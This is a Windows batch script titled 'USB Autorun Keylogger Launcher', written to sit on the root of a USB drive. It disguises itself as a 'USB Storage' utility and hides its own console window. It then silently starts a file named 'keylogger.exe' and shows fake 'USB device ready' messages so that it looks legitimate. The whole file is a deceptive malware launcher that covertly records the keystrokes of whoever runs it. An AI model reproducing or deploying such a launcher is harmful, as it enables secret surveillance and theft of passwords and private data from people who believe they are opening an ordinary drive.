@echo off
REM USB Autorun Keylogger Launcher
REM This file should be placed on USB drive root directory

title USB Storage
echo Starting USB storage...

REM Hide the console window
if not "%minimized%"=="yes" (
    set minimized=yes
    start /min "" %0
    exit
)

REM Start the keylogger silently
start /min "" "keylogger.exe"

REM Optional: Show a fake USB storage dialog to make it look legitimate
timeout /t 2 /nobreak >nul
echo USB device ready for use.
pause 